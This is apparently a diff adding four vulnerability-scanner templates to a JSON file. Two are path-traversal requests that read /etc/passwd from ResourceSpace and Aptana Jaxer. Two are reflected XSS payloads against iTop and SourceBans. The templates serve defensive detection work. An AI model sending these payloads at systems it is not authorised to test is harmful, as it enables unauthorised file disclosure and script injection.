@@ -2533,6 +2533,40 @@
       ]
     },
     {
+      "id": "CVE-2015-3648",
+      "info": {
+        "author": "pikpikcu",
+        "description": "ResourceSpace is prone to a local file-include vulnerability because it fails to sufficiently sanitize user-supplied input.",
+        "name": "ResourceSpace - Local File inclusion",
+        "reference": "- https://vulners.com/cve/CVE-2015-3648/\n- https://www.securityfocus.com/bid/75019\n",
+        "severity": "high",
+        "tags": "cve,cve2015,lfi,resourcespace"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}/pages/setup.php?defaultlanguage=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-5688",
       "info": {
         "author": "pikpikcu",
@@ -2610,6 +2644,48 @@
       ]
     },
     {
+      "id": "CVE-2015-6544",
+      "info": {
+        "author": "pikpikcu",
+        "description": "Cross-site scripting (XSS) vulnerability in application/dashboard.class.inc.php in Combodo iTop before 2.2.0-2459 allows remote attackers to inject arbitrary web script or HTML via a dashboard title.\n",
+        "name": "iTop XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2015-6544",
+        "severity": "medium",
+        "tags": "cve,cve2015,xss,itop"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/pages/ajax.render.php?operation=render_dashboard&dashboard_id=1&layout_class=DashboardLayoutOneCol&title=%%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-7297",
       "info": {
         "author": "princechaddha",
@@ -2661,6 +2737,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/CMSPages/GetDocLink.ashx?link=https://example.com/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-8349",
+      "info": {
+        "author": "pikpikcu",
+        "description": "Cross-site scripting (XSS) vulnerability in SourceBans before 2.0 pre-alpha allows remote attackers to inject arbitrary web script or HTML via the advSearch parameter to index.php.",
+        "name": "SourceBans XSS",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2015-8349",
+        "severity": "medium",
+        "tags": "cve,cve2015,xss,sourcebans"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?p=banlist&advSearch=0%27%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&advType=btype"
           ]
         }
       ]
@@ -8726,6 +8844,40 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/share/page/dologin"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-14312",
+      "info": {
+        "author": "daffainfo",
+        "description": "Aptana Jaxer 1.0.3.4547 is vulnerable to a local file inclusion vulnerability in the wikilite source code viewer. This vulnerability allows a remote attacker to read internal files on the server via a tools/sourceViewer/index.html?filename=../ URI.",
+        "name": "Aptana Jaxer 1.0.3.4547 - Local File inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/47214\n- https://www.cvedetails.com/cve/CVE-2019-14312\n",
+        "severity": "high",
+        "tags": "cve,cve2019,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/tools/sourceViewer/index.html?filename=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
           ]
         }
       ]
